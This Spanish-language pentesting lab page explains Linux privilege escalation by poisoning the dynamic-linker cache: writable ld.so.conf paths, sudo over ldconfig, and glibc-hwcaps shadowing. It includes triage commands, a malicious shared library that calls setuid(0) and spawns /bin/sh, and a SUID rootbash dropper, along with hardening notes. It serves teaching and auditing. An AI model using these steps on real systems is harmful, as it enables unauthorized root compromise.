# ejemplo de exploit de privesc de ld.so

{{#include ../../banners/hacktricks-training.md}}

Esta página es un laboratorio centrado en el poisoning de la **caché del system linker mediante `/etc/ld.so.conf` o `ldconfig`**. Para la inyección de librerías faltantes, `RPATH`/`RUNPATH` escribibles, `LD_PRELOAD` y otros abusos genéricos del linker con SUID, consulta [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Preparar el entorno

En la siguiente sección puedes encontrar el código de los archivos que vamos a utilizar para preparar el entorno

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** esos archivos en tu máquina, en la misma carpeta
2. **Compila** la **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` a `/usr/lib` y actualiza la caché: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compila** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Comprueba el entorno

Comprueba que _libcustom.so_ se está **cargando** desde _/usr/lib_ y que puedes **ejecutar** el binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos útiles de triage

Al atacar un objetivo real, verifica el **nombre exacto de la biblioteca** que necesita el binario, qué está **resolviendo actualmente el loader** y qué rutas configuradas se pueden escribir sin modificar la caché activa.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Usa `ldd` únicamente en un ejecutable **trusted**. Algunas implementaciones o intérpretes ELF inusuales pueden hacer que ejecute código controlado por un atacante; `objdump -p ./file | grep NEEDED` muestra de forma segura las dependencias directas. Para un objetivo trusted, invocar el intérprete descubierto con `--list` muestra la resolución real.<sup>[[4]](#references)</sup>

Algunos detalles importantes:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` normalmente **no funciona** porque
la redirección la realiza tu shell actual. Usa
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` en su lugar.
- Los binarios **SUID/privileged** ignoran `LD_LIBRARY_PATH`/`LD_PRELOAD` en
**secure-execution mode**, pero los directorios procedentes de `/etc/ld.so.conf` siguen
formando parte de la configuración trusted del loader, por lo que esta
misconfiguración todavía puede afectar a programas privileged.<sup>[[1]](#references)</sup>
- `LD_DEBUG` también se ignora en secure-execution mode a menos que exista `/etc/suid-debug`, por lo que debes recopilar su trace desde una ejecución non-SUID equivalente, en lugar de esperar
salida de la ejecución privileged.<sup>[[1]](#references)</sup>
- En versiones más recientes de glibc, el dynamic loader también expone
`--list-diagnostics`, lo que resulta útil para depurar la resolución de la cache y
la selección de subdirectorios `glibc-hwcaps` cuando un hijack no se comporta como
se esperaba.<sup>[[1]](#references)</sup>

### Restricciones de la cache y SONAME

`ldconfig` no almacena en la cache todos los archivos arbitrarios de un directorio configurado: examina las cabeceras ELF, reconoce nombres que coinciden con `lib*.so*` o `ld-*.so*`, y espera la cadena convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Por tanto, el objeto inyectado debe tener la arquitectura/clase del objetivo, el nombre exacto de `DT_NEEDED` (normalmente su `DT_SONAME`) y cualquier símbolo/versión que resuelva la víctima.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefiere una biblioteca específica del objetivo, como en este ejemplo. Ocultar un SONAME común con un objeto incompleto puede romper todos los procesos que lo resuelvan antes de que se ejecute el objetivo privilegiado previsto.<sup>[[3]](#references)</sup>

## Explotación

En este escenario vamos a suponer que **alguien ha creado una entrada vulnerable** dentro de un archivo en _/etc/ld.so.conf_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descarga y compila** el siguiente código dentro de esa ruta:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si esperas que **root** (u otra cuenta con privilegios) ejecute posteriormente el binario vulnerable, normalmente es mejor dejar un **artefacto propiedad de root** en lugar de iniciar una shell interactiva. Por ejemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Luego, después de que se produzca la ejecución con privilegios, puedes usar `/tmp/rootbash -p`.

Ahora que hemos **creado la biblioteca maliciosa libcustom dentro de la ruta mal configurada**, la caché predeterminada debe reconstruirse mediante una ejecución exitosa y privilegiada de **`ldconfig`**. Un reinicio solo ayuda cuando el proceso de arranque local realmente lo ejecuta; de lo contrario, espera a que un administrador realice la acción o utiliza una regla de sudo insegura si hay alguna disponible.<sup>[[2]](#references)</sup>

Una vez que esto haya ocurrido, **vuelve a comprobar** desde dónde el ejecutable `sharedvuln` está cargando la biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, **lo está cargando desde `/home/ubuntu/lib`** y, si algún usuario lo ejecuta, se ejecutará un shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Ten en cuenta que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que root u otro usuario con privilegios ejecute el binario vulnerable** podremos escalar privilegios.

### Shadowing moderno de `glibc-hwcaps`

Desde glibc 2.33, el loader puede preferir bibliotecas optimizadas ubicadas en `glibc-hwcaps/<level>/` dentro de **cada directorio de búsqueda de bibliotecas**. Por lo tanto, comprobar únicamente `/home/ubuntu/lib` es insuficiente: un subdirectorio compatible con permisos de escritura, como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, puede ocultar la biblioteca base después de que `ldconfig` la indexe, mientras que otras CPU seguirán utilizando el objeto base. Esto también proporciona un hijacking selectivo por arquitectura que puede pasar desapercibido cuando la validación se realiza en una CPU diferente.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
La guía actual de hardening de glibc recomienda evitar SONAMEs duplicados, ubicaciones de búsqueda no predeterminadas y objetos en subdirectorios `glibc-hwcaps`. Desde una perspectiva de auditoría, aplica comprobaciones recursivas de propiedad y permisos de escritura a los directorios configurados y a los componentes de su ruta principal.<sup>[[3]](#references)</sup>

### Otras configuraciones incorrectas - Same vuln

En el ejemplo anterior simulamos una configuración incorrecta en la que un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración en `/etc/ld.so.conf.d/`**.\
Pero existen otras configuraciones incorrectas que pueden causar la misma vulnerabilidad: si tienes **permisos de escritura** en algún **archivo de configuración** dentro de `/etc/ld.so.conf.d`, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf`, puedes configurar la misma vulnerabilidad y explotarla.

## Exploit 2

**Supón que tienes privilegios sudo sobre `ldconfig`**.\
Puedes indicar a `ldconfig` **desde dónde cargar los archivos conf**, por lo que podemos aprovecharlo para hacer que `ldconfig` cargue carpetas arbitrarias.<sup>[[2]](#references)</sup>\
Así que vamos a crear los archivos y carpetas necesarios para cargar "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en el **previous exploit**, **crea la library maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos el path y comprobemos desde dónde está cargando la library el binario:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como puedes ver, al tener privilegios de sudo sobre `ldconfig`, puedes explotar la misma vulnerabilidad.** Los detalles de las opciones son importantes al evaluar una regla de sudo restringida: `-f` selecciona otra configuración, pero sigue reconstruyendo `/etc/ld.so.cache`; `-C` redirige la caché a otra ubicación; `-N` evita reconstruir la caché; y `-X` evita actualizar los enlaces, pero **sigue reconstruyendo la caché, a menos que se combine con `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening del Dynamic Linker - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - página del manual de Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
